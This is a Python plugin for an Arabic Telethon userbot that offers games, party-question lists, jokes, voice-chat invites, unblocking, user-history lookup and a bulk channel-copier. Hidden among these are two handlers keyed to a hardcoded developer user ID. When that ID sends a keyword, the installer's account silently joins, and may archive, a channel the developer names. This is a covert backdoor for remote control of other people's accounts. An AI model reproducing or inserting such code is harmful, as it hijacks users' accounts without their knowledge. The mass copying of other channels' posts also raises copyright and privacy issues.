import asyncio
import random
import time
import os
import tempfile
import json

from ..helpers import reply_id, get_user_from_event
from . import BOTLOG, BOTLOG_CHATID
from telethon import functions
from collections import deque
from random import choice
from telethon.tl.types import InputPeerUser
from telethon.tl.functions.phone import CreateGroupCallRequest as startvc
from telethon.tl.functions.phone import DiscardGroupCallRequest as stopvc
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.phone import GetGroupCallRequest as getvc
from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
from JoKeRUB import l313l
from ..core.managers import edit_delete, edit_or_reply

from telethon.tl.types import InputChannel, InputPeerChannel, InputFileLocation, InputWebFileLocation
from telethon import events, functions
from telethon.tl.functions.channels import JoinChannelRequest

@l313l.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
    ok = await edit_or_reply(e, "`Inviting Members to Voice Chat...`")
    users = []
    z = 0
    async for x in e.client.iter_participants(e.chat_id):
        if not x.bot:
            users.append(x.id)
    hmm = list(user_list(users, 6))
    for p in hmm:
        try:
            await e.client(invitetovc(call=await get_call(e), users=p))
            z += 6
        except BaseException:
            pass
    await ok.edit(f"`Invited {z} users`")
@l313l.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
        await e.client(startvc(e.chat_id))
        await edit_or_reply(e, "`جار بدء المكالمة ✅...`")
    except Exception as ex:
        await edit_or_reply(e, f"`{str(ex)}`")

# ================العاب الجوكر=========================

R = [
    "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
    "  ❶ **⪼**  [حرب الفضاء 🛸](https://t.me/gamee?game=ATARIAsteroids)   \n"
    "  ❷ **⪼**  [لعبة فلابي بيرد 🐥](https://t.me/awesomebot?game=FlappyBird)   \n"
    "  ❸ **⪼**  [القط المشاكس 🐱](https://t.me/gamee?game=CrazyCat)   \n"
    "  ❹ **⪼**  [صيد الاسماك 🐟](https://t.me/gamee?game=SpikyFish3)   \n"
    "  ❺ **⪼**  [سباق الدراجات 🏍](https://t.me/gamee?game=MotoFX2)   \n"
    "  ❻ **⪼**  [سباق سيارات 🏎](https://t.me/gamee?game=F1Racer)   \n"
    "  ❼ **⪼**  [شطرنج ♟](https://t.me/T4TTTTBOT?game=chess)   \n"
    "  ❽ **⪼**  [كرة القدم ⚽](https://t.me/gamee?game=FootballStar)   \n"
    "  ❾ **⪼**  [كرة السلة 🏀](https://t.me/gamee?game=BasketBoyRush)   \n"
    "  ❿ **⪼**  [سلة 2 🎯](https://t.me/gamee?game=DoozieDunks)   \n"
    "  ⓫ **⪼**  [ضرب الاسهم 🏹](https://t.me/T4TTTTBOT?game=arrow)   \n"
    "  ⓬ **⪼**  [لعبة الالوان 🔵🔴](https://t.me/T4TTTTBOT?game=color)   \n"
    "  ⓭ **⪼**  [كونج فو 🎽](https://t.me/gamee?game=KungFuInc)   \n"
    "  ⓮ **⪼**  [🐍 لعبة الافعى 🐍](https://t.me/T4TTTTBOT?game=snake)   \n"
    "  ⓯ **⪼**  [🚀 لعبة الصواريخ 🚀](https://t.me/T4TTTTBOT?game=rocket)   \n"
    "  ⓰ **⪼**  [كيب اب 🧿](https://t.me/gamee?game=KeepitUP)   \n"
    "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
    "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
    "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩- Karar .𓆪 𖠛 ](t.me/lx5x5)   \n"
    "**-** قناة السورس **⪼ [𐇮 لـ كرار ](t.me/aqhvv)   "
]

@l313l.on(admin_cmd(pattern="بلي$"))
async def ithker(knopis):
    await knopis.edit(choice(R))

# ================= Citation_morning =================
#.اذكار - تم حذف الاذكار

kettuet = [  
"اكثر شي ينرفزك .. ؟!",
"اخر مكان رحتله ..؟!",
"سـوي تـاك @ لـ شخص تريـد تعترفلـه بشي ؟",
"تغار ..؟!",
 "هـل تعتقـد ان في أحـد يراقبـك . . .؟!",
"أشخاص ردتهم يبقون وياك ومن عرفو هلشي سوو العكس صارت معك؟",
"ولادتك بنفس المكان الي هسة عايش بي او لا؟",
"اكثر شي ينرفزك ؟",
"تغار ؟",
"كم تبلغ ذاكرة هاتفك؟",
"صندوق اسرارك ؟",
"شخص @ تعترفلة بشي ؟",
"يومك ضاع على ؟",
"اغرب شيء حدث في حياتك ؟",
"نسبة حبك للاكل ؟",
"حكمة تأمان بيها ؟",
"اكثر شي ينرفزك ؟",
"هل تعرضت للظلم من قبل؟",
"خانوك ؟",
"تاريخ غير حياتك ؟",
"أجمل سنة ميلادية مرت عليك ؟",
"ولادتك بنفس المكان الي هسة عايش بي او لا؟",
"تزعلك الدنيا ويرضيك ؟",
"ماهي هوايتك؟",
"دوله ندمت انك سافرت لها ؟",
"شخص اذا جان بلطلعة تتونس بوجود؟",
"تاخذ مليون دولار و تضرب خويك؟",
"تاريخ ميلادك؟",
"اشكم مره حبيت ؟",
"يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة ؟",
"هل تثق في نفسك ؟",
"كم مره نمت مع واحده ؟",
"اسمك الثلاثي ؟",
"كلمة لشخص خذلك؟",
"هل انت متسامح ؟",
"طريقتك المعتادة في التخلّص من الطاقة السلبية؟",
"عصير لو قهوة؟",
"تثق بـ احد ؟",
"كم مره حبيت ؟",
"اكمل الجملة التالية..... قال رسول الله ص،، انا مدينة العلم وعلي ؟",
"اوصف حياتك بكلمتين ؟",
"حياتك محلوا بدون ؟",
"وش روتينك اليومي؟",
"شي تسوي من تحس بلملل؟",
"يوم ميلادك ؟",
"اكثر مشاكلك بسبب ؟",
"تتوقع فيه احد حاقد عليك ويكرهك ؟",
"كلمة غريبة من لهجتك ومعناها؟",
"هل تحب اسمك أو تتمنى تغييره وأي الأسماء ستختار",
"كيف تشوف الجيل ذا؟",
"تاريخ لن تنساه📅؟",
"هل من الممكن أن تقتل أحدهم من أجل المال؟",
"تؤمن ان في حُب من أول نظرة ولا لا ؟.",
"‏ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭",
"طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟",
"ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
"أطول مدة نمت فيها كم ساعة؟",
"كلمة غريبة من لهجتك ومعناها؟🤓",
"ردة فعلك لو مزح معك شخص م تعرفه ؟",
"شخص تحب تستفزه😈؟",
"تشوف الغيره انانيه او حب؟",
"مع او ضد : النوم افضل حل لـ مشاكل الحياة؟",
"اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟",
"‏للشباب | آخر مرة وصلك غزل من فتاة؟🌚",
"أوصف نفسك بكلمة؟",
"شيء من صغرك ماتغير فيك؟",
"ردة فعلك لو مزح معك شخص م تعرفه ؟",
"| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.",
"كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
"حاجة تشوف نفسك مبدع فيها ؟",
"يهمك ملابسك تكون ماركة ؟",
"يومك ضاع على؟",
"اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، ماموقفك الصريح؟",
"هل من الممكن أن تقتل أحدهم من أجل المال؟",
"كلمه ماسكه معك الفترة هذي ؟",
"كيف هي أحوال قلبك؟",
"صريح، مشتاق؟",
"اغرب اسم مر عليك ؟",
"تختار أن تكون غبي أو قبيح؟",
"آخر مرة أكلت أكلتك المفضّلة؟",
"دوله ندمت انك سافرت لها😁؟",
"اشياء صعب تتقبلها بسرعه ؟",
"كلمة لشخص غالي اشتقت إليه؟💕",
"اكثر شيء تحس انه مات ف مجتمعنا؟",
"هل يمكنك مسامحة شخص أخطأ بحقك لكنه قدم الاعتذار وشعر بالندم؟",
"آخر شيء ضاع منك؟",
"تشوف الغيره انانيه او حب؟",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟",
"شيء كل م تذكرته تبتسم ...",
"هل تحبها ولماذا قمت باختيارها؟",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
"أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟", 
"هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
"هل تشعر أن هنالك مَن يُحبك؟",
"وش الشيء الي تطلع غضبك فيه لو زعلت ؟",
"صوت مغني م تحبه",
"كم في حسابك البنكي ؟",
"اذكر موقف ماتنساه بعمرك؟",
"ردة فعلك لو مزح معك شخص م تعرفه ؟",
"عندك حس فكاهي والا نفسية؟",
"من وجهة نظرك ما هي الأشياء التي تحافظ على قوة وثبات العلاقة؟",
"ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
"شيء من صغرك ماتغير فيك؟",
"هل يمكنك أن تضحي بأكثر شيء تحبه وتعبت للحصول عليه لأجل شخص تحبه؟",
"هل تحبها ولماذا قمت باختيارها؟",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟",
"كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
"كم مره تسبح باليوم",
"أفضل صفة تحبه بنفسك؟",
"أجمل شيء حصل معك خلال هاليوم؟",
"‏شيء سمعته عالق في ذهنك هاليومين؟",
"هل يمكنك تغيير صفة تتصف بها فقط لأجل شخص تحبه ولكن لا يحب تلك الصفة؟",
"‏أبرز صفة حسنة في صديقك المقرب؟",
"ما الذي يشغل بالك في الفترة الحالية؟",
"آخر مرة ضحكت من كل قلبك؟",
"اكثر دوله ودك تسافر لها🏞؟",
"آخر خبر سعيد، متى وصلك؟",
"‏نسبة احتياجك للعزلة من 10📊؟",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"أكثر جملة أثرت بك في حياتك؟",
"لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"آخر مرة ضحكت من كل قلبك؟",
"وش الشيء الي تطلع غضبك فيه لو زعلت ؟",
"متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
"تعتقد فيه أحد يراقبك👩🏼‍💻؟",
"احقر الناس هو من ...",
"شيء من صغرك ماتغير فيك؟",
"وين نلقى السعاده برايك؟",
"هل تغار/تغارين من صديقاتك/اصدقائك ؟؟",
"أكثر جملة أثرت بك في حياتك؟",
"كم عدد اللي معطيهم بلوك👹؟",
"أجمل سنة ميلادية مرت عليك ؟",
"أوصف نفسك بكلمة؟",
]


@l313l.ar_cmd(pattern="كت(?: |$)(.*)")
async def ahmed(ahmed): # Code Update by @zzzzl1l
    zelzal = ahmed.pattern_match.group(1)
    zilzal = await ahmed.get_reply_message()
    zel_zal = random.choice(kettuet)
    if not zilzal and not zelzal: # Code Update by @zzzzl1l
        return await edit_or_reply(ahmed, f"**⌔╎{zel_zal}**")
    user, custom = await get_user_from_event(ahmed)
    if not user: # Code Update by @zzzzl1l
        return
    zedth2 = user.first_name.replace("\u2060", "") if user.first_name else user.username
    if custom: # Code Update by @zzzzl1l
        zedth2 = custom
    me = await ahmed.client.get_me()
    my_first = me.first_name
    my_ahmed = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(ahmed, f"**⌔╎لـ  ** [{zedth2}](tg://user?id={user.id}) \n**⌔╎{zel_zal} .**")

HuRe_5erok = [
    "** ‎لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",
    "** لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ **",
    "** هل كذبت على والديك من قبل..؟ **",
    "** لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ **",
    "** لو خيروك |  بين أستاذ اللغة  ية أو أستاذ الرياضيات؟ **",
    "** تحس انك محظوظ بالاشخاص الي حولك ؟ **",
    "** لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ **",
    "** لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ **",
    "** لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ **",
    "** لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ **",
    "** لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ **",
    "** لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ **",
    "** لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ **",
    "** لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ **",
    "** لو خيروك |  بين رجل أعمال أو أمير؟ **",
    "** لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ **",
    "** لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ **",
    "** لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ **",
    "** لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟! **",
    "** لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ **",
    "** لو خيروك |  بين زوجتك وابنك/ابنتك؟ **",
    "** لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ **",
    "** لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ **",
    "** لو خيروك |  بين أمك وأبيك؟ **",
    "** لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ **",
    "** لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ **",
    "** لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",

]


@l313l.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_5erok))

    


HuRe_Shnow = [
    "** ‎هذا واحد طايح حظه ومسربت **",
    "** هذا واحد شراب عرك ويدور بنات وكرنج **",
    "** ولكعبة ولحمزه والانجيل والتوراة هذا ينيج 😹 **",
    "** هذا واحد فقير ومحبوب ويحب الخير للناس 😍 **",
    "** هذا اخوي وحبيبي ربي يحفظه ويخليه الية ❤️‍🔥 **",
    "** هذا واحد حلو موكف المنطقه تك رجل بحلاته 🤤 **",
]


@l313l.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_Shnow))

HuRe_Bosa = [
    "** ‎امممممممممح يبووو شنو من خد 😍 **",
    "** امممممح بوية مو شفه عسلل 😻 **",
    "** ويييع شبوس منه غير ريحة حلكة تكتل 🤮 **",
    "** ما ابوسة لعبت نفسي منه 😒 **",
    "** مححح افيششش البوسة ودتني لغير عالم 🤤 **",

]


@l313l.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_Bosa))

DevJoker = [5427469031]
#تضل تخمط من عمك الجوكر ؟ الى اين يستمُر الفشل ياغُلام
@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
            except ValueError:
                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
        else:
            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
        #await event.reply(response)

@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                await l313l.edit_folder(channel_username, folder=1)
                response = "**᯽︙ تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"
            except ValueError:
                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
        else:
            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
        #await event.reply(response)
client = l313l

@l313l.on(admin_cmd(pattern="فك الحظر$"))
async def handle_unblock_all(event):
    blocked_users = await client(functions.contacts.GetBlockedRequest(
        offset=0,
        limit=200
    ))
    if not blocked_users.users:
        await event.edit("**✧︙ لا يوجد مستخدمين محظورين في حسابك 🤷🏻**")
        return
    for user in blocked_users.users:
        try:
            await client(functions.contacts.UnblockRequest(
                id=InputPeerUser(user.id, user.access_hash)
            ))
            aljoker_entity = await client.get_entity(user.id)
            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
            await event.edit(f"✧︙ تم إلغاء حظر المستخدم : {aljoker_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
        except Exception as e:
            await event.edit(f"حدث خطأ أثناء إلغاء حظر المستخدم بمعرّف: {user.id}, الخطأ: {e}")
            continue
            
@l313l.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
async def Hussein(event):
    reply_to = event.reply_to_msg_id
    if reply_to:
        msg = await client.get_messages(event.chat_id, ids=reply_to)
        user_id = msg.sender_id
        chat = await client.get_entity("@SangMata_beta_bot")
        async with client.conversation(chat) as conv:
            await conv.send_message(f'{user_id}')
            response = await conv.get_response()
            await event.edit(response.text)



import asyncio
from telethon import events
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.types import MessageEntityBlockquote, MessageMediaPhoto, InputMediaUploadedPhoto, MessageMediaDocument
from telethon.tl.custom import Message
from . import l313l
from ..Config import Config
from ..core.managers import edit_or_reply
from . import BOTLOG, BOTLOG_CHATID

async def check_media_type(message):
    """دالة للتحقق من نوع الميديا في الرسالة"""
    
    print("\n" + "=" * 40)
    print("🔍 فحص محتوى الرسالة:")
    print(f"📝 معرف الرسالة: {message.id}")
    print(f"📝 نص الرسالة: {message.message[:50]}..." if len(message.message or "") > 50 else f"📝 نص الرسالة: {message.message}")
    
    if message.media:
        print("✅ ✅ ✅ يوجد ميديا في الرسالة ✅ ✅ ✅")
        
        # تفاصيل الميديا
        from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
        
        if isinstance(message.media, MessageMediaPhoto):
            print("📸 نوع الميديا: صورة (Photo)")
            
            # معلومات إضافية عن الصورة
            if hasattr(message.media, 'photo'):
                print(f"   - معرف الصورة: {message.media.photo.id}")
                print(f"   - حجم الصورة: {message.media.photo.size} bytes")
            
        elif isinstance(message.media, MessageMediaDocument):
            print("📄 نوع الميديا: مستند/فيديو (Document)")
            
            # معلومات إضافية عن المستند
            if hasattr(message.media, 'document'):
                print(f"   - معرف المستند: {message.media.document.id}")
                print(f"   - حجم المستند: {message.media.document.size} bytes")
                print(f"   - نوع الملف: {message.media.document.mime_type}")
                
        elif isinstance(message.media, MessageMediaWebPage):
            print("🌐 نوع الميديا: رابط ويب (WebPage)")
            
        else:
            print(f"❓ نوع ميديا آخر: {type(message.media)}")
        
        # التحقق من خاصية التشويش
        if hasattr(message.media, 'spoiler'):
            if message.media.spoiler:
                print("🔞 خاصية التشويش: مفعلة ✅")
            else:
                print("🔞 خاصية التشويش: غير مفعلة ❌")
        else:
            print("🔞 خاصية التشويش: غير مدعومة لهذا النوع")
            
    else:
        print("❌ ❌ ❌ لا يوجد ميديا في هذه الرسالة ❌ ❌ ❌")
        
    print("=" * 40 + "\n")
    
    # إرجاع نتيجة الفحص
    return {
        'has_media': message.media is not None,
        'media_type': type(message.media).__name__ if message.media else None,
        'has_spoiler': hasattr(message.media, 'spoiler') and message.media.spoiler if message.media else False,
        'text': message.message
    }

async def copy_message_with_all_features(dest_entity, message, source_channel_username):
    """نسخ الرسالة مع جميع مميزاتها (اقتباس، تشويش، تنسيق)"""
    
    print("=" * 50)
    print("فحص الرسالة:")
    print(f"معرف الرسالة: {message.id}")
    
    # التحقق من وجود ميديا
    if message.media:
        print("✓ يوجد ميديا في الرسالة")
        
        # التحقق من نوع الميديا
        from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument
        
        if isinstance(message.media, MessageMediaPhoto):
            print("✓ نوع الميديا: صورة (Photo)")
            
            # التحقق من خاصية التشويش
            if hasattr(message.media, 'spoiler') and message.media.spoiler:
                print("✓ الصورة مشوشة (Spoiler)")
            else:
                print("✓ صورة عادية بدون تشويش")
                
        elif isinstance(message.media, MessageMediaDocument):
            print("✓ نوع الميديا: مستند/فيديو (Document)")
            
            # التحقق من خاصية التشويش للمستندات
            if hasattr(message.media, 'spoiler') and message.media.spoiler:
                print("✓ المستند مشوش (Spoiler)")
            else:
                print("✓ مستند عادي بدون تشويش")
        else:
            print("✓ نوع ميديا آخر:", type(message.media))
            
        # تجهيز الميديا
        try:
            print("جاري تحميل الميديا...")
            file_data = await message.download_media(bytes)
            print(f"✓ تم تحميل الميديا بنجاح - الحجم: {len(file_data)} bytes")
            
            # التحقق من وجود خاصية التشويش
            has_spoiler = hasattr(message.media, 'spoiler') and message.media.spoiler
            print(f"✓ حالة التشويش: {has_spoiler}")
            
            # إرسال الميديا مع النص
            print("جاري إرسال الميديا للقناة المستهدفة...")
            result = await l313l.send_file(
                dest_entity,
                file_data,
                caption=message.message or "",
                spoiler=has_spoiler,
                formatting_entities=message.entities
            )
            print("✓ تم إرسال الميديا بنجاح")
            return result
            
        except Exception as e:
            print(f"✗ خطأ في تحميل/إرسال الميديا: {e}")
            raise e
    else:
        print("✗ لا يوجد ميديا في هذه الرسالة")
        print("✓ إرسال رسالة نصية فقط")
        
        # رسالة نصية فقط
        result = await l313l.send_message(
            dest_entity,
            message.message or "",
            formatting_entities=message.entities
        )
        print("✓ تم إرسال النص بنجاح")
        return result

async def start_copier(destination_channel_username, source_channel_username, limit=10000):
    try:
        print("\n" + "🚀 بدء عملية النسخ...")
        print(f"📡 القناة المصدر: @{source_channel_username}")
        print(f"🎯 القناة المستهدفة: {destination_channel_username}")
        
        # الحصول على معلومات القنوات
        print("🔍 جاري الحصول على معلومات القنوات...")
        source_channel = await l313l.get_entity(source_channel_username)
        destination_channel = await l313l.get_entity(destination_channel_username)
        destination_channel_id = destination_channel.id
        print("✅ تم الحصول على معلومات القنوات بنجاح")

        # الحصول على المنشورات من القناة المصدر
        print(f"📥 جاري جلب المنشورات (الحد الأقصى: {limit})...")
        posts = await l313l(GetHistoryRequest(
            peer=source_channel,
            limit=limit,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0,
        ))

        # عكس ترتيب الرسائل لنقلها من الأقدم إلى الأحدث
        posts.messages.reverse()
        total_posts = len(posts.messages)
        
        print(f"\n📊 بدء فحص {total_posts} رسالة...\n")
        
        media_count = 0
        text_count = 0
        spoiler_count = 0
        success_count = 0
        failed_count = 0

        # نقل المنشورات إلى القناة المستهدفة
        for i, message in enumerate(posts.messages, 1):
            print(f"\n--- جاري فحص الرسالة {i}/{total_posts} ---")
            
            # فحص نوع الميديا
            check_result = await check_media_type(message)
            
            # تحديث الإحصائيات
            if check_result['has_media']:
                media_count += 1
                if check_result['has_spoiler']:
                    spoiler_count += 1
            else:
                text_count += 1
            
            # نقل المنشور
            try:
                await copy_message_with_all_features(destination_channel_id, message, source_channel_username)
                print(f"✅ تم نقل الرسالة {i} بنجاح")
                success_count += 1
                
                # إرسال تأكيد لقناة التسجيل
                await l313l.send_message(BOTLOG_CHATID, 
                    f"**- تم نقل المنشور .. بنجاح✅**\n"
                    f"**- رابـط المنشور:**\n"
                    f"- https://t.me/{source_channel_username}/{message.id}", 
                    link_preview=False)
                
                await asyncio.sleep(1)  # مهلة بين المنشورات

            except Exception as e:
                print(f"❌ خطأ في نقل الرسالة {i}: {e}")
                failed_count += 1
                await l313l.send_message(BOTLOG_CHATID, 
                    f"**- خطـأ بنقـل المنشـور ❌**\n"
                    f"**- رابـط المنشور:**\n"
                    f"- https://t.me/{source_channel_username}/{message.id}\n"
                    f"**- تفاصيـل الخطـأ:**\n"
                    f"- {e}", 
                    link_preview=False)

        # إحصائيات نهائية
        print("\n" + "=" * 50)
        print("📊 الإحصائيات النهائية:")
        print(f"📝 إجمالي الرسائل: {total_posts}")
        print(f"🖼️ رسائل بها ميديا: {media_count}")
        print(f"🔞 رسائل بها تشويش: {spoiler_count}")
        print(f"📄 رسائل نصية فقط: {text_count}")
        print(f"✅ تم النجاح: {success_count}")
        print(f"❌ فشل: {failed_count}")
        print("=" * 50 + "\n")
        
        # إرسال الإحصائيات لقناة التسجيل
        await l313l.send_message(BOTLOG_CHATID, 
            f"**- اكتملت عملية النسخ ✅**\n"
            f"**- ملخص العملية:**\n"
            f"📝 إجمالي الرسائل: {total_posts}\n"
            f"🖼️ رسائل بها ميديا: {media_count}\n"
            f"🔞 رسائل بها تشويش: {spoiler_count}\n"
            f"📄 رسائل نصية فقط: {text_count}\n"
            f"✅ تم النجاح: {success_count}\n"
            f"❌ فشل: {failed_count}", 
            link_preview=False)

    except Exception as e:
        print(f"❌❌ حدث خطأ عام: {e}")
        await l313l.send_message(BOTLOG_CHATID, 
            f"**- حدث خطـأ ❌**\n"
            f"**- تفاصيـل الخطـأ:**\n"
            f"- {e}")

@l313l.ar_cmd(pattern="كوبي(?:\s|$)([\s\S]*)")
async def channel_copier(event):
    catty = event.pattern_match.group(1)
    
    if not catty:
        await edit_or_reply(event, "**- خطأ: يرجى تحديد اسم القناة المصدر**")
        return
        
    channel_username = str(catty.split(" ")[0])
    if channel_username.startswith("@"):
        channel_username = channel_username.replace("@", "")
    
    # دعم تحديد العدد
    parts = catty.split()
    if len(parts) > 1:
        try:
            limit = int(parts[1])
        except:
            limit = 10000
    else:
        limit = 10000
    
    await edit_or_reply(event, 
        f"**- جـارِ نقـل منشـورات الميديـا . . .**\n"
        f"**- مـن القنـاة @{channel_username}**\n"
        f"**- عدد المنشورات: {limit}**\n\n"
        f"**- انتظـر .. قد تستمـر العمليـة بضـع دقائـق**\n"
        f"**- سيتم عرض التفاصيل في التيرمينال**")
    
    # بدء عملية النسخ
    await start_copier(event.chat_id, channel_username, limit)
